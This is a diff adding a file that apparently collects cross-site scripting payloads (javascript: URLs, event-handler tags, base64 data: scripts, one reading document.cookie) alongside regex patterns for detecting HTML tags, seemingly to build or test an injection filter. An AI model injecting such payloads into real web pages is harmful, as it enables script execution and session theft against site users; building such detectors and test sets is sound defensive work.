@@ -1,0 +1,79 @@
+For any HTML tag 
+ 
+<a href=javascript:...
+<applet src="..." type=text/html>
+<applet src="data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4" type=text/html>
+<base href=javascript:...
+<base href=... // change base URL to something else to exploit relative filename inclusion
+<bgsound src=javascript:...
+<body background=javascript:...
+<body onload=...
+<embed src=http://www.example.com/flash.swf allowScriptAccess=always
+<embed src="data:image/svg+xml;
+<frameset><frame src="javascript:..."></frameset>
+<iframe src=javascript:...
+<img src=x onerror=...
+<input type=image src=javascript:...
+<layer src=...
+<link href="javascript:..." rel="stylesheet" type="text/css"
+<link href="http://www.example.com/xss.css" rel="stylesheet" type="text/css"
+<meta http-equiv="refresh" content="0;url=javascript:..."
+<meta http-equiv="refresh" content="0;url=http://;javascript:..." // evasion
+<meta http-equiv="link" rel=stylesheet content="http://www.example.com/xss.css">
+<meta http-equiv="Set-Cookie" content="NEW_COOKIE_VALUE">
+<object data=http://www.example.com
+<object type=text/x-scriptlet data=...
+<object type=application/x-shockwave-flash data=xss.swf>
+<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:...></object>     
+<script>...</script>
+<script src=http://www.example.com/xss.js></script>
+<script src="data:text/javascript,alert(1)"></script>
+<script src="data:text/javascript;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg=="></script>
+<style>STYLE</style>
+<style type=text/css>STYLE</style>
+<style type=text/javascript>alert('xss')</style>
+
+
+	 
+<(a|abbr|acronym|address|applet|area|audioscope|b|base|basefront|bdo|bgsound|big|blackface|blink|blockquote|body|bq|br|button|caption|center|cite|code|col|colgroup|comment|dd|del|dfn|dir|div|dl|dt|em|embed|fieldset|fn|font|form|frame|frameset|h1|head|hr|html|i|iframe|ilayer|img|input|ins|isindex|kdb|keygen|label|layer|legend|li|limittext|link|listing|map|marquee|menu|meta|multicol|nobr|noembed|noframes|noscript|nosmartquotes|object|ol|optgroup|option|p|param|plaintext|pre|q|rt|ruby|s|samp|script|select|server|shadow|sidebar|small|spacer|span|strike|strong|style|sub|sup|table|tbody|td|textarea|tfoot|th|thead|title|tr|tt|u|ul|var|wbr|xml|xmp)\W
+
+(<[A-z][^>]*>[\s\S]*?<\/[A-z][^>]*>|<[A-z][^>]*>[\s\S]*?<\/[A-z][[\s\S]]*[\s\S]|<[A-z][^>]*>[\s\S]*?<\/[A-z][\s]*[\s]|<[A-z][^>]*>[\s\S]*?<\/[A-z]|<[A-z][^>]*>[\s\S]*?)
+
+
+
+
+<[A-Fa-f|H-Ih-i|K-Wk-w]+[^>]*>[\s\S]+<\/[A-Fa-f|H-Ih-i|K-Wk-w][^>]*>
+
+
+
+^<=?\w+\>|\w+?="\w[A-z0-9/:/./(/)/'/;]+"=?>|<=?\/\w+>$
+
+
+^\<(?>\w+)?="[A-z0-9/:/./(/)/'/;]+"=?\/\>|\>|\w[A-z0-9/:/./(/)/'/;]+
+
+
+
+(?:\<\w*>\<\/\w*\>)
+
+
+
+^<(?>[A-z]+)(>[A-Z\;\'\-\<\>\"\:\.\,\(\)\d\s]+)\<\/(?>[A-z]+)>|^<(?>[A-z]+)\s*[A-z\<\>\s]+=?="[A-Z\;\'\"\:\.\,\(\)\d\s]+=?\>
+
+
+
+
+<script>alert(123)</script>
+<script>alert("123");</script>
+<script>alert("hellox worldss");</script>
+<IMG SRC="javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TABLE>
+<form><button formaction="javascript:alert(123)">crosssitespt
+<frameset onload="alert(123)">
+
+
+
+
+(?i)<(?>[A-z]+)>[A-Z0-9\;\'\-\/\<\>\"\\\:\.\,\(\)\d\s]+\<\/(?>[A-z]+)>|\s*[A-z\<\>\s]+=?="[A-Z0-9\;\'\:\.\,\(\)\d\s]+"?\>
